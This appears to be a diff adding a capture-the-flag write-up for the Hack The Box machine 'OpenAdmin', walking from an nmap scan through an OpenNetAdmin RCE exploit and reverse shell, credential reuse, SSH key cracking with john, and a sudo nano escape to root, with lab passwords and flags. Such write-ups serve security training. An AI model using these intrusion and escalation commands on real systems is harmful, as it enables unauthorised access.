@@ -1,0 +1,93 @@
+Box name: OpenAdmin
+OS: Linux
+Difficulty: Easy
+IP: 10.10.10.171
+
+# Nmap 7.80 scan initiated Mon Jan  6 14:35:46 2020 as: nmap -A -sV -Pn -T4 -v -oN initial.nmap 10.10.10.171
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA)
+|   256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA)
+|_  256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: POST OPTIONS HEAD GET
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+# Nmap done at Mon Jan  6 14:36:23 2020 -- 1 IP address (1 host up) scanned in 37.77 seconds
+
+Host is running OpenNetAdmin v18.1.1 which is vulnerable to a RCE exploit https://www.exploit-db.com/exploits/47691
+
+I re-wrote the exploit to spawn a reverse shell, can be found in exploit.sh
+    ./exploit.sh http://openadmin.htb/ona/ 10.10.14.x 2004
+
+catch reverse shell with:
+    ncat -lvnp 2004
+
+shell'd
+
+Turn the dumb shell into a nice interactive one:
+    python3 -c "import pty;pty.spawn('/bin/bash')"
+    ^Z
+    stty raw -echo
+    fg
+    <RETURN>
+    <RETURN>
+    TERM=screen
+
+Found credentials to the mysql database in /var/www/ona/local/config/database_settings.inc.php
+    ona_sys:n1nj4W4rri0R!
+
+Found credentials to opennetadmin in the database:
+    guest:test
+    admin:admin
+
+I can log into the account: jimmy with these credentials:
+    su jimmy:n1nj4W4rri0R!
+
+It looks like I need access to the joanna account for user.
+
+in /var/www/internal/ there are 3 php files, main.php is getting the contents of joanna's ssh private key.
+
+running
+    netstat -tulpn
+shows a high port of 52846
+
+So I run
+    curl 127.0.0.1:52846
+which spits out the HTML portions of the index.php file int the internal web directory.
+
+running:
+    curl 127.0.0.1:52846/main.php
+Spits out joanna's ssh private key.
+
+The key looks encrypted
+
+Writing that to a file with permissions 600 and running:
+    ssh -i id_rsa joanna@openadmin.htb
+
+Password prompt, the key is encrypted.
+running
+    /usr/share/john/ssh2john.py id_rsa > id_rsa.john
+    john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john
+
+spits out the key's password.
+    joanna:bloodninjas
+
+logging into ssh now as joanna:
+    ssh -i id_rsa joanna@openadmin.htb
+    bloodninjas
+
+user'd
+c9b2cf07d40807e62af62660f0c81b5f
+
+sudo -l shows I can 'sudo /bin/nano /opt/priv'
+    sudo /bin/nano /opt/priv
+    ^R
+    ^X
+    reset; bash 1>&0 2>&0
+
+root'd
+2f907ed450b361b2c2bf4e8795d5b561
+
